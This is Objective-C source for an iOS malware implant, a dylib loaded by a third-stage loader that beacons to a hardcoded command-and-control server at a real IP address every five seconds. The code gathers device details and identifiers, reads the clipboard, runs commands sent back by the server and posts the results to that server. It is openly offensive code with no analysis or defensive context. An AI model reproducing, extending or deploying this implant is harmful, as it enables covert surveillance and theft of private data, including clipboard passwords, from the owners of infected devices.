#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreLocation/CoreLocation.h>

// C2配置
#define C2_SERVER_URL @"http://47.239.147.3:8080"
#define HEARTBEAT_INTERVAL 5.0

// 全局变量
static NSString *clientId = nil;
static NSTimer *heartbeatTimer = nil;

// ========================================
// 设备信息收集
// ========================================
NSDictionary* collectDeviceInfo() {
    UIDevice *device = [UIDevice currentDevice];

    return @{
        @"model": device.model,
        @"system_name": device.systemName,
        @"system_version": device.systemVersion,
        @"name": device.name,
        @"identifier": [[device identifierForVendor] UUIDString]
    };
}

// ========================================
// 获取剪贴板内容
// ========================================
NSDictionary* getClipboard() {
    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
    NSString *text = pasteboard.string;

    if (text) {
        return @{@"text": text};
    } else {
        return @{@"error": @"Clipboard is empty"};
    }
}

// ========================================
// 获取电池状态
// ========================================
NSDictionary* getBatteryStatus() {
    UIDevice *device = [UIDevice currentDevice];
    device.batteryMonitoringEnabled = YES;

    float batteryLevel = device.batteryLevel;
    UIDeviceBatteryState batteryState = device.batteryState;

    NSString *chargingStatus;
    switch (batteryState) {
        case UIDeviceBatteryStateCharging:
            chargingStatus = @"charging";
            break;
        case UIDeviceBatteryStateFull:
            chargingStatus = @"full";
            break;
        default:
            chargingStatus = @"not_charging";
            break;
    }

    return @{
        @"level": @(batteryLevel * 100),
        @"charging": chargingStatus
    };
}

// ========================================
// 发送HTTP请求
// ========================================
void sendHTTPRequest(NSString *endpoint, NSDictionary *data, void (^completion)(NSDictionary *response)) {
    NSURL *url = [NSURL URLWithString:[C2_SERVER_URL stringByAppendingString:endpoint]];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:data options:0 error:&error];
    [request setHTTPBody:jsonData];

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (data) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (completion) completion(json);
        }
    }];
    [task resume];
}

// ========================================
// 执行命令
// ========================================
void executeCommand(NSDictionary *cmd) {
    NSString *command = cmd[@"command"];
    NSString *commandId = cmd[@"command_id"];
    NSDictionary *result = nil;

    if ([command isEqualToString:@"get_device_info"]) {
        result = collectDeviceInfo();
    } else if ([command isEqualToString:@"get_clipboard"]) {
        result = getClipboard();
    } else if ([command isEqualToString:@"battery_status"]) {
        result = getBatteryStatus();
    } else {
        result = @{@"error": [NSString stringWithFormat:@"Unknown command: %@", command]};
    }

    // 发送结果
    NSDictionary *payload = @{
        @"client_id": clientId,
        @"command_id": commandId,
        @"result": result
    };
    sendHTTPRequest(@"/api/result", payload, nil);
}

// ========================================
// 发送心跳
// ========================================
void sendHeartbeat() {
    NSDictionary *payload = @{
        @"client_id": clientId ?: @"",
        @"device_info": collectDeviceInfo()
    };

    sendHTTPRequest(@"/api/beacon", payload, ^(NSDictionary *response) {
        // 保存client_id
        if (!clientId && response[@"client_id"]) {
            clientId = [response[@"client_id"] copy];
            NSLog(@"[C2] Registered with ID: %@", clientId);
        }

        // 处理命令
        NSArray *commands = response[@"commands"];
        if (commands && commands.count > 0) {
            NSLog(@"[C2] Received %lu command(s)", (unsigned long)commands.count);
            for (NSDictionary *cmd in commands) {
                executeCommand(cmd);
            }
        }
    });
}

// ========================================
// 主入口函数 - Stage3会调用这个
// ========================================
void process() {
    NSLog(@"[C2] Custom C2 dylib loaded!");
    NSLog(@"[C2] Connecting to: %@", C2_SERVER_URL);

    // 立即发送第一次心跳
    sendHeartbeat();

    // 启动定时心跳
    dispatch_async(dispatch_get_main_queue(), ^{
        heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:HEARTBEAT_INTERVAL
                                                          target:[NSBlockOperation blockOperationWithBlock:^{
            sendHeartbeat();
        }]
                                                        selector:@selector(main)
                                                        userInfo:nil
                                                         repeats:YES];
    });

    NSLog(@"[C2] C2 client started successfully!");
}


